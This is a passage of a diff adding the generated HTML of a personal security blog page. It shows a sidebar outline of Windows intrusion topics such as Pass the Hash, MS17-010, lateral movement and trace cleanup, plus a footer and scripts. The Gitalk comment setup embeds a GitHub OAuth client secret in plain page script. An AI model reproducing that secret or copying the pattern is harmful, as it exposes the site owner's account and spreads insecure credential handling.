href="#Net-NTLM-hash"><span class="nav-number">3.4.2.</span> <span class="nav-text">Net-NTLM hash</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#网络欺骗"><span class="nav-number">3.4.2.1.</span> <span class="nav-text">网络欺骗</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#计算机密码"><span class="nav-number">3.4.3.</span> <span class="nav-text">计算机密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#横向移动"><span class="nav-number">3.5.</span> <span class="nav-text">横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MS17-010"><span class="nav-number">3.5.1.</span> <span class="nav-text">MS17-010</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pass-the-Hash"><span class="nav-number">3.5.2.</span> <span class="nav-text">Pass the Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pass-the-Ticket"><span class="nav-number">3.5.3.</span> <span class="nav-text">Pass the Ticket</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#添加域控管理员"><span class="nav-number">3.5.4.</span> <span class="nav-text">添加域控管理员</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IPC连接"><span class="nav-number">3.5.5.</span> <span class="nav-text">IPC连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF派生shell给Cobaltstrike"><span class="nav-number">3.5.6.</span> <span class="nav-text">MSF派生shell给Cobaltstrike</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#权限维持"><span class="nav-number">3.6.</span> <span class="nav-text">权限维持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#痕迹清理"><span class="nav-number">3.7.</span> <span class="nav-text">痕迹清理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#todo"><span class="nav-number">4.</span> <span class="nav-text">todo</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.5m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">22:21</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
